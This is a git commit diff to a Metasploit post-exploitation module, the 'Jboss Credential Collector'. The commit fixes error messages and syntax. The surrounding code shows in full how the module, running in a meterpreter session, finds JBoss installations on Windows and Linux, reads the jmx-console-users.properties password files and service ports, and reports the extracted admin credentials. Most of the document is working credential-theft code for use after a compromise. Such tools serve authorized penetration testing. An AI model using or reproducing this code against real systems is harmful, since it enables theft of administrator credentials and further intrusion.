9f289bdf52d06d86bae1638d77361d81f0452a08
Koen Riepe <koen.riepe@fox-it.com>
2017-04-12 13:48:11 +0200

    Fixed error messages and some syntax.

--- modules/post/multi/gather/jboss_gather.rb
+++ modules/post/multi/gather/jboss_gather.rb
@@ -5,17 +5,19 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::System
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'      => 'Jboss Credential Collector',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name' => 'Jboss Credential Collector',
+      'Description' => %q(
         This module can be used to extract the Jboss admin passwords for version 4,5 and 6.
-      },
-      'License'     => MSF_LICENSE,
-      'Author'    => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
-      'Platform'    => [ 'linux', 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+      ),
+      'License' => MSF_LICENSE,
+      'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
+      'Platform' => [ 'linux', 'win' ],
+      'SessionTypes' => [ 'meterpreter' ]
+    )
+    )
   end
 
   def report_creds(user, pass, port)
@@ -56,7 +58,7 @@ class MetasploitModule < Msf::Post
       begin
         lines = read_file(pwfile).split("\n")
       rescue
-        print_error("Cannot open #{array[i]}, you probably don't have permissions to open the file.")
+        print_error("Cannot open #{pwfile}, you probably don't have permissions to open the file.")
         next
       end
       for line in lines
@@ -66,7 +68,7 @@ class MetasploitModule < Msf::Post
           report_creds(creds[0], creds[1], ports[i])
         end
       end
-      i+=1
+      i += 1
     end
   end
 
@@ -120,12 +122,12 @@ class MetasploitModule < Msf::Post
       end
       if not version == "NONE"
         print_status("Found a Jboss installation version: #{version}")
-        instances = wingetinstances(home,version)
+        instances = wingetinstances(home, version)
         pwfiles = winpwfiles(instances)
         listenports = wingetport(instances)
-        getpw(pwfiles,listenports)
+        getpw(pwfiles, listenports)
       end
-      i+=1
+      i += 1
     end
   end
 
@@ -153,14 +155,13 @@ class MetasploitModule < Msf::Post
     type1 = cmd_exec('locate bindings-jboss-beans.xml').split("\n")
     type2 = cmd_exec('locate jboss-web.deployer/server.xml').split("\n")
     port = []
-
     type1.each do |file1|
       if file1 and file1.include? version
         print_status("Attempting to extract Jboss service ports from: #{file1}")
         begin
           file1_read = read_file(file1).split("\n")
         rescue
-          print_error("Cannot open #{array[i]}, you probably don't have permissions to open the file.")
+          print_error("Cannot open #{file1}, you probably don't have permissions to open the file.")
           next
         end
         parse = false
@@ -182,9 +183,9 @@ class MetasploitModule < Msf::Post
       if file2 and file2.include? version
         print_status("Attempting to extract Jboss service ports from: #{file2}")
         begin
-          xml2  = Nokogiri::XML(read_file(file2))
+          xml2 = Nokogiri::XML(read_file(file2))
         rescue
-          print_error("Cannot open #{array[i]}, you probably don't have permissions to open the file.")
+          print_error("Cannot open #{file2}, you probably don't have permissions to open the file.")
           next
         end
         xml2.xpath("//Server//Connector").each do |connector|
@@ -206,17 +207,17 @@ class MetasploitModule < Msf::Post
   def winhome
     home = []
     exec = cmd_exec('WMIC PROCESS get Caption,Commandline').split("\n")
-      exec.each do |line|
-        if line.downcase.include? "java.exe" and line.downcase.include? "jboss"
-          print_status('Jboss service found')
-          parse = line.split('-classpath "')[1].split("\\bin\\")[0]
-          if parse[0] == ';'
-            home.push(parse.split(';')[1])
-          else
-            home.push(parse)
-          end
+    exec.each do |line|
+      if line.downcase.include? "java.exe" and line.downcase.include? "jboss"
+        print_status('Jboss service found')
+        parse = line.split('-classpath "')[1].split("\\bin\\")[0]
+        if parse[0] == ';'
+          home.push(parse.split(';')[1])
+        else
+          home.push(parse)
         end
       end
+    end
     return home
   end
 
@@ -224,26 +225,26 @@ class MetasploitModule < Msf::Post
     instances = []
     instance_location = "#{home}\\server"
     exec = cmd_exec("cmd /c dir #{instance_location}").split("\n")
-    exec.each do |instance|
-     if instance.split("<DIR>")[1]
-       if (not instance.split("<DIR>")[1].strip.include? ".") and (not instance.split("<DIR>")[1].strip.include? "..")
-         instance_path = "#{home}\\server\\#{(instance.split("<DIR>")[1].strip)}"
-         if instance_path.include? version
-           instances.push(instance_path)
-         end
-       end
-     end
-    end
+      exec.each do |instance|
+        if instance.split("<DIR>")[1]
+          if (not instance.split("<DIR>")[1].strip.include? ".") and (not instance.split("<DIR>")[1].strip.include? "..")
+            instance_path = "#{home}\\server\\#{(instance.split('<DIR>')[1].strip)}"
+            if instance_path.include? version
+              instances.push(instance_path)
+            end
+          end
+        end
+      end
     return instances
   end
 
   def winpwfiles(instances)
     files = []
     instances.each do |seed|
-     file_path = "#{seed}\\conf\\props\\jmx-console-users.properties"
-     if exist?(file_path)
-       files.push(file_path)
-     end
+      file_path = "#{seed}\\conf\\props\\jmx-console-users.properties"
+      if exist?(file_path)
+        files.push(file_path)
+      end
     end
     return files
   end
@@ -308,10 +309,14 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if sysinfo['OS'].include? "Windows"
-      gatherwin
-    else
-      gathernix
+    begin
+      if sysinfo['OS'].include? "Windows"
+        gatherwin
+      else
+        gathernix
+      end
+    rescue
+      print_error('sysinfo function not available, you are probably using a wrong meterpreter.')
     end
   end
 end
